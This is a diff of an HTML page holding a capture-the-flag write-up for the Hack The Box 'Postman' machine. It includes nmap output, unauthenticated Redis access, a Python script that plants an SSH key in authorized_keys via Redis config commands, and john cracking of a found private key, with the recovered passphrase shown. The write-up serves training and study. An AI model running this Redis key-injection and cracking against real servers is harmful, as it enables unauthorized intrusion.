@@ -33,13 +33,15 @@
 
     
       <link rel="icon" type="image/x-icon" href="/assets/favicon-color-0e896bd8673d9f83cea8d7b0a12fcc894681d58fc475ad499adfed94067b1e1f.png">
-      <link rel="apple-touch-icon" href="/assets/apple-touch-icon-light-87d1f2a3a19b1500e5c1626a0492025ca5f7f97d24540dc5900288e92112925a.png">
-      <link rel="stylesheet" type="text/css" title="light" id="light" href="/assets/light-268b84a5df702d717857e91d8b80ec0f176d52b07f0893bd82eac76e7e8f0c40.css">
-      <link rel="stylesheet" type="text/css" title="dark" id="dark" href="/assets/dark-b6f8f6ceb983aa3da9f5bf7550d7516c131ba02c21bd7efe6fcdc1ac1eb1a693.css" disabled="true">
+      <link rel="apple-touch-icon" href="/assets/apple-touch-icon-dark-d161409442b7e523089f24d08d0a55951549ece7504207c376d53b020713494d.png">
+      <link rel="stylesheet" type="text/css" href="/assets/dark-bd87a972117a631461755cc733ab96b66bb38fb9d09359688cac8e4c2c561606.css">
     
 
   
 
+  <!-- Load KaTeX -->
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.1.1/katex.min.css">
+<script src="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.1.1/katex.min.js"></script>
 </head>
 
 <body>
@@ -119,21 +121,15 @@
       </li>
     
     
-      <li>
-        <a onclick="toggle()" title="Toggle Theme">
-          <svg xmlns="http://www.w3.org/2000/svg" class="icon-theme">
-  <use href="/assets/theme-610197c56844c5ba34608b2018c4cc3b79f8833e2efc7a99bcb5589f1d3cfd7b.svg#icon-theme" xlink:href="/assets/theme-610197c56844c5ba34608b2018c4cc3b79f8833e2efc7a99bcb5589f1d3cfd7b.svg#icon-theme"></use>
-</svg>
-
-        </a>
-      </li>
-    
   </ul>
 </nav>
 
 
   <ul class="header-tags scrollappear">
     
+    
+      
+        <li><a href="/tag/AES">Aes</a></li>
     
       
         <li><a href="/tag/ASC-Wargames">Asc-wargames</a></li>
@@ -161,9 +157,6 @@
     
       
         <li><a href="/tag/c">C</a></li>
-    
-      
-        <li><a href="/tag/cracking">Cracking</a></li>
     
       
         <li>...</li>
@@ -226,16 +219,16 @@
 <p>It was an easy machine from <strong>Hack The Box</strong> with:</p>
 <ul>
   <li>
-<code class="highlighter-rouge">Redis</code> unauthenticated RCE.</li>
+<code class="language-plaintext highlighter-rouge">Redis</code> unauthenticated RCE.</li>
   <li>SSH user private key in some system folder.</li>
   <li>Webmin package update RCE with Metasploit.</li>
 </ul>
 
 <h2 id="1-enumeration">1. Enumeration</h2>
 
-<p>First things first lets add <code class="highlighter-rouge">10.10.10.160</code> in <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">postman.htb</code> and enumerate our machine with <code class="highlighter-rouge">nmap</code> to discover open ports and services.</p>
+<p>First things first lets add <code class="language-plaintext highlighter-rouge">10.10.10.160</code> in <code class="language-plaintext highlighter-rouge">/etc/hosts</code> as <code class="language-plaintext highlighter-rouge">postman.htb</code> and enumerate our machine with <code class="language-plaintext highlighter-rouge">nmap</code> to discover open ports and services.</p>
 
-<p>I ran initial <code class="highlighter-rouge">nmap</code> and got some stuff, but that wasn’t enough. So, lets run <code class="highlighter-rouge">nmap</code> with all ports to see what’s really running on this machine.</p>
+<p>I ran initial <code class="language-plaintext highlighter-rouge">nmap</code> and got some stuff, but that wasn’t enough. So, lets run <code class="language-plaintext highlighter-rouge">nmap</code> with all ports to see what’s really running on this machine.</p>
 
 <figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p-</span> <span class="nt">-sT</span> <span class="nt">-T4</span> <span class="nt">-o</span> postman-all postman.htb
 <span class="gp">#</span><span class="w"> </span>Nmap 7.80 scan initiated Thu Jan  9 15:55:57 2020 as: nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p-</span> <span class="nt">-sT</span> <span class="nt">-T4</span> <span class="nt">-o</span> postman-all 10.10.10.160
@@ -261,34 +254,34 @@ PORT      STATE SERVICE    VERSION
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span><span class="gp">#</span><span class="w"> </span>Nmap <span class="k">done </span>at Thu Jan  9 16:12:00 2020 <span class="nt">--</span> 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>963.15 seconds</code></pre></figure>
 
-<p>We found <code class="highlighter-rouge">http</code> on port <code class="highlighter-rouge">80, 10000</code>, <code class="highlighter-rouge">ssh</code> on port <code class="highlighter-rouge">22</code> and the interesting one was <code class="highlighter-rouge">Redis</code> on port <code class="highlighter-rouge">6347</code>. So, lets go to the browser to see what is running on those ports <code class="highlighter-rouge">80, 10000</code>.</p>
+<p>We found <code class="language-plaintext highlighter-rouge">http</code> on port <code class="language-plaintext highlighter-rouge">80, 10000</code>, <code class="language-plaintext highlighter-rouge">ssh</code> on port <code class="language-plaintext highlighter-rouge">22</code> and the interesting one was <code class="language-plaintext highlighter-rouge">Redis</code> on port <code class="language-plaintext highlighter-rouge">6347</code>. So, lets go to the browser to see what is running on those ports <code class="language-plaintext highlighter-rouge">80, 10000</code>.</p>
 
 <h4 id="web-enumeration">Web Enumeration</h4>
-<p>The home page on port <code class="highlighter-rouge">80</code> was sort of nothing just a little scroll to top button:</p>
+<p>The home page on port <code class="language-plaintext highlighter-rouge">80</code> was sort of nothing just a little scroll to top button:</p>
 
 <p><a href="/assets/documentation/hack-the-box/postman/home_page-07c412d83bab203b5d67e293f24d211b4045ed293d63676912ddac20d045ce1a.png">
   <img src="/assets/documentation/hack-the-box/postman/home_page-07c412d83bab203b5d67e293f24d211b4045ed293d63676912ddac20d045ce1a.png" alt="OpenAdmin" class="zooming" data-rjs="/assets/documentation/hack-the-box/postman/home_page-07c412d83bab203b5d67e293f24d211b4045ed293d63676912ddac20d045ce1a.png" data-zooming-width="1870" data-zooming-height="1041">
 </a></p>
 
-<p>Lets check the other port <code class="highlighter-rouge">postman.htb:10000</code>:</p>
+<p>Lets check the other port <code class="language-plaintext highlighter-rouge">postman.htb:10000</code>:</p>
 
 <p><a href="/assets/documentation/hack-the-box/postman/ssl_err-49b94b45ea8c14a2c83a385dc94e75e1c52651abc3265112e79071ef2f5811b7.png">
   <img src="/assets/documentation/hack-the-box/postman/ssl_err-49b94b45ea8c14a2c83a385dc94e75e1c52651abc3265112e79071ef2f5811b7.png" alt="OpenAdmin" class="zooming" data-rjs="/assets/documentation/hack-the-box/postman/ssl_err-49b94b45ea8c14a2c83a385dc94e75e1c52651abc3265112e79071ef2f5811b7.png" data-zooming-width="1870" data-zooming-height="497">
 </a></p>
 
-<p>It shows us an <code class="highlighter-rouge">SSL</code> error, so lets add <code class="highlighter-rouge">https</code>:</p>
+<p>It shows us an <code class="language-plaintext highlighter-rouge">SSL</code> error, so lets add <code class="language-plaintext highlighter-rouge">https</code>:</p>
 
 <p><a href="/assets/documentation/hack-the-box/postman/webmin_login-b8ec5d28f2893a5a64ba4caf7f4a370bf0ecf325f0957bb3f6ef0923eefe9f9a.png">
   <img src="/assets/documentation/hack-the-box/postman/webmin_login-b8ec5d28f2893a5a64ba4caf7f4a370bf0ecf325f0957bb3f6ef0923eefe9f9a.png" alt="OpenAdmin" class="zooming" data-rjs="/assets/documentation/hack-the-box/postman/webmin_login-b8ec5d28f2893a5a64ba4caf7f4a370bf0ecf325f0957bb3f6ef0923eefe9f9a.png" data-zooming-width="1871" data-zooming-height="824">
 </a></p>
 
-<p>Now it’s sort of <code class="highlighter-rouge">login</code> page for some web app called <strong>Webmin</strong>, so let us search what it is.</p>
+<p>Now it’s sort of <code class="language-plaintext highlighter-rouge">login</code> page for some web app called <strong>Webmin</strong>, so let us search what it is.</p>
 
 <blockquote>
   <p>“<strong>Webmin</strong> is a web-based interface for system administration for Unix. Using any modern web browser, you can setup user accounts, Apache, DNS, file sharing and much more.”</p>
 </blockquote>
 
-<p>So, it’s an app able to configure and manage Unix system files. I tried to intercept the login request with <code class="highlighter-rouge">burp</code> to see what can I do with it, but it seems well-configured and there is no way to brute force because the response time for each request and that could take very long time. Don’t forget it’s an easy box.</p>
+<p>So, it’s an app able to configure and manage Unix system files. I tried to intercept the login request with <code class="language-plaintext highlighter-rouge">burp</code> to see what can I do with it, but it seems well-configured and there is no way to brute force because the response time for each request and that could take very long time. Don’t forget it’s an easy box.</p>
 
 <h4 id="redis-enumeration">Redis Enumeration</h4>
 
@@ -296,25 +289,25 @@ Service detection performed. Please report any incorrect results at https://nmap
   <p>“<strong>Redis</strong> is an in-memory data structure project implementing a distributed, in-memory key-value database with optional durability. It supports different kinds of abstract data structures, such as strings, lists, maps, sets, sorted sets, bitmaps, streams, and spatial indexes.”</p>
 </blockquote>
 
-<p>Now we still have <code class="highlighter-rouge">Redis</code> on port <code class="highlighter-rouge">6347</code>.  I don’ know much about it, so let’s search about <code class="highlighter-rouge">Redis</code> database and how to connect to it with Linux. After searching, I found <code class="highlighter-rouge">Redis</code> Command Line Interface to interact with <code class="highlighter-rouge">Redis</code> servers.</p>
+<p>Now we still have <code class="language-plaintext highlighter-rouge">Redis</code> on port <code class="language-plaintext highlighter-rouge">6347</code>.  I don’ know much about it, so let’s search about <code class="language-plaintext highlighter-rouge">Redis</code> database and how to connect to it with Linux. After searching, I found <code class="language-plaintext highlighter-rouge">Redis</code> Command Line Interface to interact with <code class="language-plaintext highlighter-rouge">Redis</code> servers.</p>
 
 <figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>redis-cli <span class="nt">-h</span> postman.htb
 <span class="gp">postman.htb:6379&gt;</span></code></pre></figure>
 
-<p>After installing <code class="highlighter-rouge">redis-cli</code> and trying to connect to <code class="highlighter-rouge">postman.htb</code> it. We got an access without any sort of authentication. I spend some time learning basic <code class="highlighter-rouge">Redis</code> commands to see what can I do with it until I got something.</p>
+<p>After installing <code class="language-plaintext highlighter-rouge">redis-cli</code> and trying to connect to <code class="language-plaintext highlighter-rouge">postman.htb</code> it. We got an access without any sort of authentication. I spend some time learning basic <code class="language-plaintext highlighter-rouge">Redis</code> commands to see what can I do with it until I got something.</p>
 
 <figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">postman.htb:6379&gt;</span><span class="w"> </span>config get <span class="nb">dir</span>
 <span class="go">1) "dir"
 2) "/var/lib/redis/.ssh"
 </span><span class="gp">postman.htb:6379&gt;</span><span class="w"> </span></code></pre></figure>
 
-<p>The command above just shows us where’s the config file for this <code class="highlighter-rouge">Redis</code> instance and we got <code class="highlighter-rouge">.ssh</code> as config file. I struggled with this a lot thinking what I can do to take advantage of that config file.</p>
+<p>The command above just shows us where’s the config file for this <code class="language-plaintext highlighter-rouge">Redis</code> instance and we got <code class="language-plaintext highlighter-rouge">.ssh</code> as config file. I struggled with this a lot thinking what I can do to take advantage of that config file.</p>
 
 <h2 id="2-exploitation">2. Exploitation</h2>
 
-<p>We know that the machine run <code class="highlighter-rouge">ssh</code> service so I found that I can put something on the <code class="highlighter-rouge">Redis</code> memory, copy it into a random file let say <code class="highlighter-rouge">~/ssh/authorized_keys</code> as config file in order to gain access with <code class="highlighter-rouge">ssh</code>.</p>
+<p>We know that the machine run <code class="language-plaintext highlighter-rouge">ssh</code> service so I found that I can put something on the <code class="language-plaintext highlighter-rouge">Redis</code> memory, copy it into a random file let say <code class="language-plaintext highlighter-rouge">~/ssh/authorized_keys</code> as config file in order to gain access with <code class="language-plaintext highlighter-rouge">ssh</code>.</p>
 
-<p>Let us generate <code class="highlighter-rouge">ssh</code> key:</p>
+<p>Let us generate <code class="language-plaintext highlighter-rouge">ssh</code> key:</p>
 
 <figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>ssh-keygen <span class="nt">-t</span> rsa
 <span class="go">Generating public/private rsa key pair.
@@ -338,21 +331,21 @@ The key's randomart image is:
 |       o...      |
 +----[SHA256]-----+</span></code></pre></figure>
 
-<p>Now we have the key. Our goal is to put it into the <code class="highlighter-rouge">Redis</code> server memory and after that we can transfer it into a file, in a way that the <code class="highlighter-rouge">authorized_keys</code> is still a valid file.</p>
+<p>Now we have the key. Our goal is to put it into the <code class="language-plaintext highlighter-rouge">Redis</code> server memory and after that we can transfer it into a file, in a way that the <code class="language-plaintext highlighter-rouge">authorized_keys</code> is still a valid file.</p>
 
-<p>To store the key into the <code class="highlighter-rouge">Redis</code> memory, we should use the <code class="highlighter-rouge">RDP</code> format.</p>
+<p>To store the key into the <code class="language-plaintext highlighter-rouge">Redis</code> memory, we should use the <code class="language-plaintext highlighter-rouge">RDP</code> format.</p>
 
 <blockquote>
   <p>“<strong>RDB</strong> format is a binary representation of the in-memory store.”</p>
 </blockquote>
 
-<p>By adding some padding around <code class="highlighter-rouge">ssh</code> public key we generated.</p>
+<p>By adding some padding around <code class="language-plaintext highlighter-rouge">ssh</code> public key we generated.</p>
 
 <figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span><span class="o">(</span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span><span class="p">;</span> <span class="nb">cat </span>id_rsa.pub<span class="p">;</span> <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span><span class="o">)</span> <span class="o">&gt;</span> key.txt</code></pre></figure>
 
-<p>Now <code class="highlighter-rouge">key.txt</code> is our public key with new lines. We can write this inside <code class="highlighter-rouge">Redis</code> memory  using <code class="highlighter-rouge">redis-cli</code>.</p>
+<p>Now <code class="language-plaintext highlighter-rouge">key.txt</code> is our public key with new lines. We can write this inside <code class="language-plaintext highlighter-rouge">Redis</code> memory  using <code class="language-plaintext highlighter-rouge">redis-cli</code>.</p>
 
-<p>The writing process takes some steps and I love writing code, so let’s automate our process with the following <code class="highlighter-rouge">python</code> script:</p>
+<p>The writing process takes some steps and I love writing code, so let’s automate our process with the following <code class="language-plaintext highlighter-rouge">python</code> script:</p>
 
 <figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/env python
 </span>
@@ -361,49 +354,49 @@ The key's randomart image is:
 <span class="kn">from</span> <span class="nn">termcolor</span> <span class="kn">import</span> <span class="n">colored</span>
 <span class="kn">import</span> <span class="nn">sys</span>
 
-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'critical'</span>
-<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'critical'</span>
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
     <span class="k">print</span><span class="p">(</span><span class="s">"Usage: exploit.py [ip]"</span><span class="p">)</span>
     <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
-<span class="n">ip</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-<span class="n">pub_key</span> <span class="o">=</span> <span class="s">"cat key.txt | redis-cli -h {} -x set crackit"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)</span>
-<span class="n">flush</span> <span class="o">=</span> <span class="s">"redis-cli -h {} flushall"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)</span>
+<span class="n">ip</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">pub_key</span> <span class="o">=</span> <span class="s">"cat key.txt | redis-cli -h {} -x set crackit"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)</span>
+<span class="n">flush</span> <span class="o">=</span> <span class="s">"redis-cli -h {} flushall"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)</span>
 
 <span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">"[!] Flushing memory."</span><span class="p">,</span> <span class="s">"yellow"</span><span class="p">)</span>
-<span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">"[+] "</span> <span class="o">+</span> <span class="n">Popen</span><span class="p">(</span><span class="n">flush</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">PIPE</span><span class="p">)</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"green"</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">"[+] "</span> <span class="o">+</span> <span class="n">Popen</span><span class="p">(</span><span class="n">flush</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">PIPE</span><span class="p">).</span><span class="n">stdout</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"green"</span><span class="p">)</span>
 
 <span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">"[!] Sending public key."</span><span class="p">,</span> <span class="s">"yellow"</span><span class="p">)</span>
 <span class="n">p1</span> <span class="o">=</span> <span class="n">Popen</span><span class="p">(</span><span class="n">pub_key</span><span class="p">[:</span><span class="mi">2</span><span class="p">],</span><span class="n">stdout</span><span class="o">=</span><span class="n">PIPE</span><span class="p">)</span>
-<span class="n">p2</span> <span class="o">=</span> <span class="n">Popen</span><span class="p">(</span><span class="n">pub_key</span><span class="p">[</span><span class="mi">3</span><span class="p">:],</span> <span class="n">stdin</span><span class="o">=</span><span class="n">p1</span><span class="o">.</span><span class="n">stdout</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">PIPE</span><span class="p">)</span>
-<span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">"[+] "</span> <span class="o">+</span> <span class="n">p2</span><span class="o">.</span><span class="n">communicate</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"green"</span><span class="p">)</span>
+<span class="n">p2</span> <span class="o">=</span> <span class="n">Popen</span><span class="p">(</span><span class="n">pub_key</span><span class="p">[</span><span class="mi">3</span><span class="p">:],</span> <span class="n">stdin</span><span class="o">=</span><span class="n">p1</span><span class="p">.</span><span class="n">stdout</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">PIPE</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">"[+] "</span> <span class="o">+</span> <span class="n">p2</span><span class="p">.</span><span class="n">communicate</span><span class="p">()[</span><span class="mi">0</span><span class="p">].</span><span class="n">strip</span><span class="p">()</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"green"</span><span class="p">)</span>
 
 <span class="n">redis</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="mi">6379</span><span class="p">)</span>
 <span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">"[!] Setting config directory"</span><span class="p">,</span> <span class="s">"yellow"</span><span class="p">)</span>
-<span class="n">redis</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"config set dir '/var/lib/redis/.ssh'"</span><span class="p">)</span>
-<span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">"["</span> <span class="o">+</span><span class="n">redis</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">"] OK</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"green"</span><span class="p">)</span>
+<span class="n">redis</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"config set dir '/var/lib/redis/.ssh'"</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">"["</span> <span class="o">+</span><span class="n">redis</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">"] OK</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"green"</span><span class="p">)</span>
 
 <span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">"[!] Setting 'authorized_keys' as config file."</span><span class="p">,</span> <span class="s">"yellow"</span><span class="p">)</span>
-<span class="n">redis</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"config set dbfilename </span><span class="se">\"</span><span class="s">authorized_keys</span><span class="se">\"</span><span class="s">"</span><span class="p">)</span>
-<span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">"["</span> <span class="o">+</span><span class="n">redis</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">"] OK</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"green"</span><span class="p">)</span>
+<span class="n">redis</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"config set dbfilename </span><span class="se">\"</span><span class="s">authorized_keys</span><span class="se">\"</span><span class="s">"</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">"["</span> <span class="o">+</span><span class="n">redis</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">"] OK</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"green"</span><span class="p">)</span>
 
 <span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">"[!] Saving our config settings."</span><span class="p">,</span> <span class="s">"yellow"</span><span class="p">)</span>
-<span class="n">redis</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"save"</span><span class="p">)</span>
-<span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">"["</span> <span class="o">+</span><span class="n">redis</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">"] OK</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"green"</span><span class="p">)</span>
+<span class="n">redis</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"save"</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">"["</span> <span class="o">+</span><span class="n">redis</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">"] OK</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"green"</span><span class="p">)</span>
 
-<span class="k">print</span> <span class="s">"[+] Now you can connect to the server via 'ssh -i priv_key redis@{}' with your private key.</span><span class="se">\n</span><span class="s">"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span></code></pre></figure>
+<span class="k">print</span> <span class="s">"[+] Now you can connect to the server via 'ssh -i priv_key redis@{}' with your private key.</span><span class="se">\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span></code></pre></figure>
 
 <p>The script does the following steps:</p>
 
 <ul>
-  <li>Flushing <code class="highlighter-rouge">Redis</code> memory to start writing our key.</li>
-  <li>Sending our padded <code class="highlighter-rouge">ssh</code> public key to <code class="highlighter-rouge">Redis</code> memory.</li>
-  <li>Setting <code class="highlighter-rouge">Redis</code> config directory to be <code class="highlighter-rouge">.ssh</code>.</li>
-  <li>Setting <code class="highlighter-rouge">authorized_keys</code> as a <code class="highlighter-rouge">Redis</code> config file.</li>
+  <li>Flushing <code class="language-plaintext highlighter-rouge">Redis</code> memory to start writing our key.</li>
+  <li>Sending our padded <code class="language-plaintext highlighter-rouge">ssh</code> public key to <code class="language-plaintext highlighter-rouge">Redis</code> memory.</li>
+  <li>Setting <code class="language-plaintext highlighter-rouge">Redis</code> config directory to be <code class="language-plaintext highlighter-rouge">.ssh</code>.</li>
+  <li>Setting <code class="language-plaintext highlighter-rouge">authorized_keys</code> as a <code class="language-plaintext highlighter-rouge">Redis</code> config file.</li>
   <li>Saving the config settings.</li>
 </ul>
 
-<p>Now we’re able to gain access via <code class="highlighter-rouge">ssh</code>  using our private key:</p>
+<p>Now we’re able to gain access via <code class="language-plaintext highlighter-rouge">ssh</code>  using our private key:</p>
 
 <p><a href="/assets/documentation/hack-the-box/postman/exploit-ee94bcfcdc91c89ff66a2472e4eb64e3813be3a85614ce12d0b7751d91461d6f.png">
   <img src="/assets/documentation/hack-the-box/postman/exploit-ee94bcfcdc91c89ff66a2472e4eb64e3813be3a85614ce12d0b7751d91461d6f.png" alt="OpenAdmin" class="zooming" data-rjs="/assets/documentation/hack-the-box/postman/exploit-ee94bcfcdc91c89ff66a2472e4eb64e3813be3a85614ce12d0b7751d91461d6f.png" data-zooming-width="1223" data-zooming-height="807">
@@ -425,7 +418,7 @@ sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
 Matt:x:1000:1000:,,,:/home/Matt:/bin/bash
 redis:x:107:114::/var/lib/redis:/bin/bash</span></code></pre></figure>
 
-<p>We already on <code class="highlighter-rouge">redis</code>, so we can see what user <code class="highlighter-rouge">Matt</code> can do on the system:</p>
+<p>We already on <code class="language-plaintext highlighter-rouge">redis</code>, so we can see what user <code class="language-plaintext highlighter-rouge">Matt</code> can do on the system:</p>
 
 <figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">redis@Postman:~#</span><span class="w"> </span>find / <span class="nt">-type</span> f <span class="nt">-ls</span> 2&gt;/dev/null | <span class="nb">grep </span>Matt | <span class="nb">head</span> <span class="nt">-5</span>
 <span class="go">   158996      4 -rwxr-xr-x   1 Matt     Matt         1743 Aug 26 00:11 /opt/id_rsa.bak
@@ -435,13 +428,13 @@ redis:x:107:114::/var/lib/redis:/bin/bash</span></code></pre></figure>
    158997      4 -rw-rw-r--   1 Matt            Matt                   66 Aug 26 00:48 /home/Matt/.selected_editor
    143266      4 -rw-r--r--   1 Matt            Matt                  807 Aug 25 15:10 /home/Matt/.profile</span></code></pre></figure>
 
-<p>Oh! We found some sort of <code class="highlighter-rouge">ssh</code> private key inside <code class="highlighter-rouge">/opt/id_rsa.bak</code>. Let’s copy it into our machine and extract it using <code class="highlighter-rouge">ssh2john</code>.</p>
+<p>Oh! We found some sort of <code class="language-plaintext highlighter-rouge">ssh</code> private key inside <code class="language-plaintext highlighter-rouge">/opt/id_rsa.bak</code>. Let’s copy it into our machine and extract it using <code class="language-plaintext highlighter-rouge">ssh2john</code>.</p>
 
 <figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>ssh2john matt.key <span class="o">&gt;</span> matt.priv</code></pre></figure>
 
 <h4 id="own-user">Own User</h4>
 
-<p>Now we’re able to use our friend <code class="highlighter-rouge">john</code> to crack the <code class="highlighter-rouge">matt.priv</code> and own user:</p>
+<p>Now we’re able to use our friend <code class="language-plaintext highlighter-rouge">john</code> to crack the <code class="language-plaintext highlighter-rouge">matt.priv</code> and own user:</p>
 
 <figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt matt.priv 
 <span class="go">Using default input encoding: UTF-8
@@ -454,13 +447,13 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 computer2008     (matt.key)
 1g 0:00:00:19 18.30% (ETA: 20:09:25) 0.05221g/s 148343p/s 148343c/s 148343C/s w33mof</span></code></pre></figure>
 
-<p>And we got <code class="highlighter-rouge">computer2008</code> as a <code class="highlighter-rouge">ssh</code> password. I tried to connect with <code class="highlighter-rouge">ssh</code>, but something went wrong.</p>
+<p>And we got <code class="language-plaintext highlighter-rouge">computer2008</code> as a <code class="language-plaintext highlighter-rouge">ssh</code> password. I tried to connect with <code class="language-plaintext highlighter-rouge">ssh</code>, but something went wrong.</p>
 
 <figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>ssh <span class="nt">-i</span> matt.key Matt@postman.htb
 <span class="go">Enter passphrase for key 'matt.key': 
 Connection closed by 10.10.10.160 port 22</span></code></pre></figure>
 
-<p>So I tried to switch to user <code class="highlighter-rouge">Matt</code> from <code class="highlighter-rouge">redis</code> user and it worked.</p>
+<p>So I tried to switch to user <code class="language-plaintext highlighter-rouge">Matt</code> from <code class="language-plaintext highlighter-rouge">redis</code> user and it worked.</p>
 
